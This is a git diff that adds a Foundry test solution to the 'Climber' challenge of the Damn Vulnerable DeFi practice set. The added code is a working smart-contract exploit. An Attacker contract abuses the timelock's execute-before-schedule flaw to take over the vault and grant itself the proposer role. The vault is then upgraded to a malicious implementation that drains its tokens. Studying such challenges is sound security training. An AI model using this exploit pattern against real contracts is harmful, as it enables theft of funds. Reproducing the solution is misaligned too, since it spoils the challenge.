@@ -3,10 +3,11 @@
 pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
-import {ClimberVault} from "../../src/climber/ClimberVault.sol";
+import {ClimberVault, OwnableUpgradeable, Initializable, UUPSUpgradeable} from "../../src/climber/ClimberVault.sol";
 import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
 import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
+import {AccessControl} from "@openzeppelin/contracts/access/AccessControl.sol";
 
 contract ClimberChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -85,7 +86,15 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
-        
+        Attacker attacker = new Attacker(timelock, vault, player);
+        (address[] memory targets, uint256[] memory values, bytes[] memory dataElements, bytes32 salt) =
+            attacker.getCallData();
+        timelock.execute(targets, values, dataElements, salt);
+
+        assertEq(vault.owner(), player);
+        vault.upgradeToAndCall(
+            address(new MaliciousClimberVault()), abi.encodeCall(MaliciousClimberVault.withdraw, (token, recovery))
+        );
     }
 
     /**
@@ -94,5 +103,51 @@ contract ClimberChallenge is Test {
     function _isSolved() private view {
         assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
         assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
+    }
+}
+
+contract Attacker {
+    ClimberTimelock timelock;
+    ClimberVault vault;
+    address player;
+
+    constructor(ClimberTimelock _timelock, ClimberVault _vault, address _player) {
+        timelock = _timelock;
+        vault = _vault;
+        player = _player;
+    }
+
+    function getCallData()
+        public
+        view
+        returns (address[] memory targets, uint256[] memory values, bytes[] memory dataElements, bytes32 salt)
+    {
+        salt = bytes32(uint256(0));
+        values = new uint256[](4);
+        targets = new address[](4);
+        dataElements = new bytes[](4);
+
+        targets[0] = address(vault);
+        dataElements[0] = abi.encodeCall(OwnableUpgradeable.transferOwnership, (player));
+
+        targets[1] = address(timelock);
+        dataElements[1] = abi.encodeCall(ClimberTimelock.updateDelay, (0));
+
+        targets[2] = address(timelock);
+        dataElements[2] = abi.encodeCall(AccessControl.grantRole, (PROPOSER_ROLE, address(this)));
+
+        targets[3] = address(this);
+        dataElements[3] = abi.encodeWithSignature("attack()");
+    }
+
+    function attack() external {
+        (address[] memory targets, uint256[] memory values, bytes[] memory dataElements, bytes32 salt) = getCallData();
+        timelock.schedule(targets, values, dataElements, salt);
+    }
+}
+
+contract MaliciousClimberVault is ClimberVault {
+    function withdraw(DamnValuableToken token, address recipient) external {
+        token.transfer(recipient, token.balanceOf(address(this)));
     }
 }
